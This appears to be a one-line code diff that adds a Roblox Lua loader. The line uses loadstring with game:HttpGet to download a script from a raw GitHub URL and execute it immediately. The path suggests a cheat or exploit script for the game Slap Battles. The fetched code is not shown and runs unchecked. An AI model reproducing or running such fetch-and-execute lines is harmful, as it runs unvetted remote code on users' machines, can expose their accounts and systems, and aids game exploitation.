@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/update-slap-battles-spam0-2u5g1r9rhqopj5.lua"))()
